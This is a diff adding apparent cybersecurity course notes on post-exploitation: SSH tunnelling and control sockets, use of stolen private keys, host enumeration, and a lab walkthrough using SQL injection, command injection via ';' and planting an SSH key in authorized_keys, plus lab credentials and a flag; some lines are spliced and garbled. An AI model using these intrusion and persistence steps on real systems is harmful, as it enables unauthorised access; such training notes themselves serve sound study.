@@ -821,6 +821,177 @@ _____Windows Buffer Overflow_____
 use payload/windows/shell_reverse_tcp
 stephenbradshaw/vulnserver.exe
 
+https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
+
+_____Post Exploitation_____
+Pivoting and Redirection
+Control Sockets
+Enumeration
+Exfiltration
+SSH Overview
+Using an SSH client on op station, server on target
+SSH user@target -L <user port on local>:targethost:TARGETPORT
+	Test to see if creds work
+SSH Masqurade - logging in with creds that dont belong to you
+-L local port forward or local listening tunnel
+SSH Keys
+asymmetric pair, user and public, can replace passwords (put public key on target key location)
+can also grab a target's private key and install it on your machine
+chmod 600 /home/student/stolenkey
+ssh -i /home/student/stolenkey user@target
+
+Control Sockets
+data exfiltration and less logging
+creates special type of file (socket file) proves youre already logged into an ssh server, used to make more ssh sessions (no password needed)
+COmmand Line Method
+ssh -M -S /tmp/s root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>
+ssh -S /tmp/s x@x
+scp -o 'ControlPath=/tmp/s' x@x:<PATH>
+Config File Method (~?.ssh/ssh_config)
+HostName *
+ControlPath ~/.ssh/controlmasters/%r@%h:%p
+ControlMaster auto
+ControlPersist 10m
+
+Local Host Enumeration
+user enumeration
+windows
+net user
+linux
+cat /etc/passwrd (identify users and valid accounts that can be logged in to)
+cat /etc/hosts (used for DNS translation. )
+
+process enumeration
+helps identify logging, security, vilnerable service, etc. what's running on the machine?
+/usr/bin/rsyslogd  - check config for process
+look for cron jobs
+windows
+tasklist /v
+linux
+ps -elf 
+lsof | grep .ssh (look to see if ssh has a hidden file loaded)
+ls -la (to look for hidden files/folders)
+
+service enumeration
+win
+tasklist /svc (probably better to just use the gui task manager)
+lin
+chkconfig #SysV
+systemctl --type=service # SystemD
+
+network connection enumeration
+win
+ipconfig /all
+lin
+ipconfig -a #(SysV depreciated)
+ip a #SystemD (wont help with the security section becuse boxes are in little local area networks)
+netstat -antup (see listening ports on tcp) (can't see PID unless you're root)
+tcpdump to look for patterns
+netcat to understand data revealed by pattern
+
+data exfil
+session transcript
+ssh <user@host> | tee
+obfuscation windows
+type <>file | %{$__ -replace ... more stuff on slides}
+
+commands to run from outside
+whoami
+date & time
+id
+sudo -l (check what sudo commands you can run)
+cat /etc/sudoers
+w (check to see what sessions are open)
+last (check log ins)
+uptime (how long has a system be up - system stability)
+hostname 
+uname -a 
+uname -r (get kernel release)
+cat /etc/*rel*
+ls -la /etc (look for configurables that we might exploit)admin/: Possible admin folder
+|   /admin/login.php: Possible admin fol
+cat /var/log/auth.log | grep -i successful
+ls -la /tmp
+
+
+some important directory information
+drwxrwxrwt
+d = file descriptor bit (directory) 
+l = symbolic link
+rwx read write execute
+owning user, owning group, everyone else
+. = this directory, .. = one directory up
+bin has binaries
+boot has boot stuff
+dev has devices info (where system memorializes hardware)
+etc has everything configurable
+home has user directories
+lib has libraries
+lost+found has restored orphaned files
+media has os installation disk
+mnt has mounted devices, external hardware
+module_scripts has 
+opt has optional software, different from bin, local management tools
+proc has processes, memory space
+root stores all directories 
+run has volitime runtime data, wiped on reboot
+sbin contains binary executables and command line tools that are preserved for the root user.
+snap package management, software installation method
+srv contains site-specific data served by your system running Red Hat Enterprise Linux. This directory gives users the location of data files for a particular service, such as FTP, WWW, or CVS
+sys a virtual file system that contains a set of virtual files that provide an interface to the Linux kernel
+tmp has temporary stuff, globally read/write
+usr where you should install programs that are valid for your user, a secondary file hierarchy that contains shareable, read-only data
+var has variables, admin stuff, variable data, usually home to server applications
+
+find / -iname shadow -type f 2>/dev/null
+
+windows
+regedit
+
+post exercises
+extra -> intra -> internal
+
+nmap scripts
+
+nmap the distant target with scripts to see what other pages might exist 
+find admin/admin.php
+try some sql for the creds admin' or 1='1
+check the processes 
+enter commands by leading with a ;
+;whoami
+	www-data
+because we are www-data, we need to find their home directory
+www-data:x:33:33:www-data:/var/www:/bin/bash
+their home is /var/www
+so we need to make the .ssh directory there
+;mkdir /var/www/.ssh
+then echo our rsa into that directory (the following is broken up to be easier to read)
+;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCsUiWgYJPNiBr0aqr0TWblzvVHkxEUpkWPRhh2UvC989YObzUV6IOhq3be4mWB86ZJe63AvipwS8lfwZfmUwbacW+K0feXLGD4
+kinQO2uYDebL3fAWWXqCZ0L49V+RvsDSGmhIVv16cQgv50oqianOfxPRmYeNGRwzh2cUItd/c1Lg0nvxb9/vOjsRllIJp0fegPHES5tayZwn5GRSVF3UG6Y3ISswO16GAja7c0H2RF5tYM
+2M2F5eUyzsSQ6gbv/3i5zmPp/dE+kd/eBkY/IHvK65uc8valtE79EdSF3B5zzG2IKoZekelFFOozj8OVR2A952KI35tJK9tNR1Hoy1GEuPeglJ51n7t/ZsXYLNosQepm+70SSqtBZxq/Xr
+rQj4CR3lV0dXSBHwi80V/oXWvpph49dw/1CQ3xQS8mH4IiK3ZCD70B6qBwjxobgeHzLLjddoDba1S2OYOx4/CypeEb5EEMmQSambawxEHTOSK8NS5rbF0nTnaRhS5pBAonHqaJdqc6TpC7
+CZewd3Ne2zCtBgeNt2e9OCI034mA6BGW/tC/fwv4MLgyYmjlT1ow5rAjw4H4zZ/Hr4r4B/56tftHcRUANKnlO6CmLCH2w3/z3Uy7MUjDYtbXa8uMTHCULEdDwO04qChrf0CMgZ5xl/iMmW
+Ce9ssABrU9YFz5Th9w== student@lin-ops" >> /var/www/.ssh/authorized_keys
+(actual input)
+;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCsUiWgYJPNiBr0aqr0TWblzvVHkxEUpkWPRhh2UvC989YObzUV6IOhq3be4mWB86ZJe63AvipwS8lfwZfmUwbacW+K0feXLGD4kinQO2uYDebL3fAWWXqCZ0L49V+RvsDSGmhIVv16cQgv50oqianOfxPRmYeNGRwzh2cUItd/c1Lg0nvxb9/vOjsRllIJp0fegPHES5tayZwn5GRSVF3UG6Y3ISswO16GAja7c0H2RF5tYM2M2F5eUyzsSQ6gbv/3i5zmPp/dE+kd/eBkY/IHvK65uc8valtE79EdSF3B5zzG2IKoZekelFFOozj8OVR2A952KI35tJK9tNR1Hoy1GEuPeglJ51n7t/ZsXYLNosQepm+70SSqtBZxq/XrrQj4CR3lV0dXSBHwi80V/oXWvpph49dw/1CQ3xQS8mH4IiK3ZCD70B6qBwjxobgeHzLLjddoDba1S2OYOx4/CypeEb5EEMmQSambawxEHTOSK8NS5rbF0nTnaRhS5pBAonHqaJdqc6TpC7CZewd3Ne2zCtBgeNt2e9OCI034mA6BGW/tC/fwv4MLgyYmjlT1ow5rAjw4H4zZ/Hr4r4B/56tftHcRUANKnlO6CmLCH2w3/z3Uy7MUjDYtbXa8uMTHCULEdDwO04qChrf0CMgZ5xl/iMmWCe9ssABrU9YFz5Th9w== student@lin-ops" >> /var/www/.ssh/authorized_keys
+
+now that we have uploaded our rsa to that user's home directory, we should be able to ssh into that machine
+
+student@lin-ops:~$ proxychains ssh www-data@192.168.28.100 -p 2222
+(we don't use the -i command here because we are using our key that we put on the box. the -i will come into play when we copy a users id_rsa.pub into our own id_rsa)
+manually navigate around and see if you can find anything interest192.168.56.1   badguy
+#f1@g = M9TLW5VjvuNquvmMU18t
+ing
+we find a directory called Dekstop in comrade's home directory
+check out the content of that and get the flag
+
+now we need to set up this new box
+
+on 192.168.150.253
+comrade::StudentMidwayPassword
+
+192.168.56.1   badguy
+#f1@g = M9TLW5VjvuNquvmMU18t
 
 
 
